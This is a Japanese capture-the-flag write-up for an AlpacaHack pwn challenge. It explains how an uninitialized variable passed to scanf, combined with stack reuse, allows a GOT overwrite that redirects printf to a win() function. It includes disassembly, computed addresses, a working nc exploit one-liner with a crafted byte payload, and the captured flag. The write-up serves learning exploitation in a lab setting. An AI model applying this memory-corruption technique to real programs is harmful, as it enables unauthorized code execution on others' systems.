# 2026/02/22 問題

https://alpacahack.com/daily/challenges/noob-programmer

## 問題文

```
Noob programmer wrote a C language at first time.

nc 34.170.146.252 17684
```

## 考察

Stack Overflow かと思ったが、　`fgets()` でバッファのサイズ (32 bytes) を指定しているためオーバーフローは難しい。

```
void show_welcome() {
    char name[0x20];
    printf("Input your name> ");
    fgets(name,sizeof(name),stdin);
    printf("Welcome! %s",name);
}
```

Gemini 先生にヒントを乞うと、「scanf() での格納先の typo 」、「スタックの再利用」、「GOT Overwrite」が鍵になるとのこと。

### `scanf()` での格納先の typo

`scanf()` で変数に値を格納するときは変数のポインタを渡すために `&age` を渡す必要があるが、 `&` が抜けているため、`age` の値をそのままメモリアドレスとして解釈し、そこに値の書き込みを行おうとする。

```
void ask_room_number() {
    long age;
    printf("Input your room number> ");
    scanf("%ld",age);
    printf("Ok! I'll visit your room!");
}
```

### スタックの再利用

`age` を悪用するにしても初期化されていないのであれば、どこに書き込まれるか分からない。ここで関数の呼び出しの仕組みが効いてくる。

1. `show_welcome()` が呼ばれると、スタック上に `name[0x20]` のスペースが確保される。
2. `show_welcome()` が終了すると、そのスペースは論理的に解放されるが、データは消去されずに残っている。
3. 直後に `ask_room_number()` が呼ばれ、スタック上に `age` のスペースが確保される。
4. このとき、 `age` が配置されるメモリアドレスは、先ほど `name[]` があった場所（またはその一部）と重なる。

つまり、　`show_welcome()` で入力した文字（バイト列）がそのまま `age` の初期値として扱われることになる。

### GOT Overwrite

実行時にリンクするライブラリ (動的ライブラリ) はヒープ領域上にランダムに置かれる。そのアドレスを解決して呼び出すキャッシュ機構が GOT / PLT であり、 GOT を書き換えることで当該ライブラリを呼び出したときに想定されていない処理を実行することができる。

- GOT (Global Offset Table)
  - 最初は PLT へのアドレスの表となっていて、アドレス解決後は直接ライブラリへのアドレスが書き込まれる
- PLT (Procedure Linkage Table)
  - アドレスを解決し、ライブラリを呼び出す関数表

今回は1回目の入力で、書き換えたいメモリアドレスを入力し、 `age` の格納先アドレスを GOT のアドレスに改竄する。2回目の入力で関数 `win()` のアドレスを入力することで、関数 `win()` を不正に呼び出す。

### 調査

まずは `name[]` と `age` のアドレスが重なる場所を特定する。 `show_welcom()` と `ask_room_number()` が連続して `main()` から呼ばれているため、全く同じ深さのスタックフレームが再利用されることがわかる。

gcc はスタックを高いアドレスから確保し、配列は低いアドレスから要素を埋めていく。 `name[]` は 32 バイトの配列で、 `age` の 8 バイトであることから、 `name[]` の 25 バイト目が `age` の先頭アドレスとなる。

GOT のアドレスを調査。 `printf()` は `puts()` に置き換わっている可能性があるので、まずは `scanf()` 後に呼び出されるのが `printf()` か `puts()` かを調査する。

```
$ objdump -d 2026-02/02-22_pwn/noob-programmer/chal | grep -A 30 "<ask_room_number>:"
00000000004011da <ask_room_number>:
  4011da: f3 0f 1e fa                   endbr64
  4011de: 55                            pushq   %rbp
  4011df: 48 89 e5                      movq    %rsp, %rbp
  4011e2: 48 83 ec 10                   subq    $0x10, %rsp
  4011e6: 48 8d 05 1f 0e 00 00          leaq    0xe1f(%rip), %rax       # 0x40200c <_IO_stdin_used+0xc>
  4011ed: 48 89 c7                      movq    %rax, %rdi
  4011f0: b8 00 00 00 00                movl    $0x0, %eax
  4011f5: e8 96 fe ff ff                callq   0x401090 <.plt.sec+0x10>
  4011fa: 48 8b 45 f8                   movq    -0x8(%rbp), %rax
  4011fe: 48 89 c6                      movq    %rax, %rsi
  401201: 48 8d 05 1d 0e 00 00          leaq    0xe1d(%rip), %rax       # 0x402025 <_IO_stdin_used+0x25>
  401208: 48 89 c7                      movq    %rax, %rdi
  40120b: b8 00 00 00 00                movl    $0x0, %eax
  401210: e8 ab fe ff ff                callq   0x4010c0 <.plt.sec+0x40>
  401215: 48 8d 05 0d 0e 00 00          leaq    0xe0d(%rip), %rax       # 0x402029 <_IO_stdin_used+0x29>
  40121c: 48 89 c7                      movq    %rax, %rdi
  40121f: b8 00 00 00 00                movl    $0x0, %eax
  401224: e8 67 fe ff ff                callq   0x401090 <.plt.sec+0x10>
  401229: 90                            nop
  40122a: c9                            leave
  40122b: c3                            retq

000000000040122c <show_welcome>:
  40122c: f3 0f 1e fa                   endbr64
  401230: 55                            pushq   %rbp
  401231: 48 89 e5                      movq    %rsp, %rbp
  401234: 48 83 ec 20                   subq    $0x20, %rsp
  401238: 48 8d 05 04 0e 00 00          leaq    0xe04(%rip), %rax       # 0x402043 <_IO_stdin_used+0x43>
  40123f: 48 89 c7                      movq    %rax, %rdi
  401242: b8 00 00 00 00                movl    $0x0, %eax
```

`scanf()` 後も `printf()` が呼ばれている。つまり、 `printf()` の GOT アドレスを確認する

```
$ objdump -R 2026-02/02-22_pwn/noob-programmer/chal | grep printf
0000000000404008 R_X86_64_JUMP_SLOT       printf
```

関数 `win()` のアドレスを調査

```
$ objdump -d 2026-02/02-22_pwn/noob-programmer/chal | grep win
00000000004011b6 <win>:
```

入力すべき値は全てわかった

- `printf()` の GOT アドレス: `0x404008`
- `win()` のアドレス: `0x4011b6`

## 解答

`age` のメモリ部分にはバイトデータの形式で printf() の GOT アドレス `0x0000000000404008` ( 64 ビット, 8 バイトのメモリ空間に `0x404008` を置くため先頭をゼロ埋めしたもの ) を書き込む必要がある。 `fgets()` は送られてきたバイトデータをそのままメモリに書き込む。

`0x0000000000404008` をメモリに書き込む順番（リトルエンディアン）に１バイトずつ区切ると、以下のようになる。

| 順番 | バイトデータ | この数値が偶然持っている ASCII 文字としての意味 |
| ---- | ------------ | ----------------------------------------------- |
| 1    | 08           | バックスペース (制御文字)                       |
| 2    | 40           | @                                               |
| 3    | 40           | @                                               |
| 4    | 00           | NULL 文字 (制御文字)                            |
| 5    | 00           | NULL 文字 (制御文字)                            |
| 6    | 00           | NULL 文字 (制御文字)                            |
| 7    | 00           | NULL 文字 (制御文字)                            |
| 8    | 00           | NULL 文字 (制御文字)                            |

手入力では表現できない制御文字が含まれているので、何らかの方法でバイトコード `0x08` , `0x00` を入力する必要がある。
`printf()` は `\x` をプレフィックスに付与するとバイトコードにデコードして出力する機能があるため、それを利用する。

一方で `scanf("%ld", age)` と 10 進数が入力されることを期待されているため、 `4011b6` を変換した `4198838` を入力すれば良い。

```
$ (printf "AAAAAAAAAAAAAAAAAAAAAAAA\x08\x40\x40\x00\x00\x00\x00\n"; cat) | nc 34.170.146.252 17684
Input your name> Welcome! AAAAAAAAAAAAAAAAAAAAAAA@@Input your room number> 4198838
cat /flag.txt
Alpaca{un1n1t1al1z3d_buff3r_frfr_1ec1996179022982fb9fa05d2c5853a6}
```

`printf()` で２度目の入力以降は手入力を行いたいのでパイプが閉じられない(=入力ストリームが終わらない)よう `cat` で待機状態を維持する。

## 備考

### リトルエンディアンの「下から」とは？

リトルエンディアンの「下」とは、文字通りメモリアドレスの低い方のことを指す。最下位バイト/ビット LSB (Least Significant Byte/Bit) とも呼ばれる。

今回の `0x404008` の場合、最上位は `40` で、最下位は `08` となる。

読み込みも同様に LSB から順に行われる。
